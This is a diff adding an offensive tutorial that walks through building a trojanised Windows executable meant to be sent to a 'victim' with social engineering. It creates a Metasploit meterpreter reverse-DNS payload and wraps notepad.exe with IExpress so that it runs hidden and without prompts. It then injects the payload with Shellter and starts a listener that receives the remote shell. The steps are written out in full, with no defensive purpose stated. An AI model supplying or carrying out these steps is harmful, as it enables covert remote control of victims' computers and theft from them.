@@ -1,0 +1,47 @@
+This method is done with attach a file that we've modificated, and then send to our victim. We have to combine this method with Social-engineering to leverage our prabability to success.
+Before we go, this time will divide into three sections. First section is about to create the payload, second section about to create .exe file, and the last is about to combine that both of file with tools, Shellter.
+
+Session 1 :Creating Payload
+1. Type service postgreesql start in terminal
+2. Type msfconsole
+3. After that, type "use payload/windows/meterpreter/reverse_tcp_dns
+4. Type "show options"
+5. Type set LHOST to set our localhost IP address
+6. Type set LPORT to input our local port
+7. type "generate -f FILENAME -p PLATFORM -t TYPEDATA. For example, "generate -f links -p windows -t raw
+8. And finally our payload file can be found in our home folder
+
+Session 2 : Creating Executable File
+1. Open (32 Bit) C:\Windows\System32\Iexpress.exe (Right CLick and select Run as Administrator) 
+        (64 Bit) C:\Windows\SysWOW64\Iexpress.exe (Right CLick and select Run as Administrator) 
+2. Checked Self Extraction Directive File, then click next
+3. Checked Extract Files and run an installation command. Then click next.
+4. On Package Title give name of package that we will make. For example, links.exe
+5. Confirmation Prompt, checked No Prompt and click next
+6. License Agreement, checked Do not display and click next
+7. Click add and choose file that exist in our computer. On this case, we choose notepad.exe
+8. Install program to launch, on field install Program click the sign mark and choose notepad.exe, so is it with below field. then click next
+9. Show window, checked Hidden and click next
+10.Check no message and click next
+11.Check no restart and click next
+12. On this step, windows ask us to choose where directory that we will store executable file.
+13. Check No restart, click next and wait untill the process will finish.
+
+Session 3 : Combine Payload and Executable file with Shellter.
+1. Open Shellter, right click and run as administrator
+2. Type A then enter
+3. Type N then enter
+4. Type location of executable file that you make
+5. Wait for a while, and when you ask to choose the payload, type C then enter
+6. After that, type file location of our payload
+7. If Shellter ask Reflective DLL Loader, type N and enter
+8. Wait for process until finish.
+
+Create listener
+1. Type "msfconsole" in terminal
+2. Type "use exploit/multi/handler"
+3. Type "set LHOST YOUR_IP_ADDRESS"
+4. Type "set LPORT 4444"
+5. Type "set payload windows/meterpreter/reverse_tcp_dns
+6. Type "set exitonsession false"
+7. Type "exploit -j
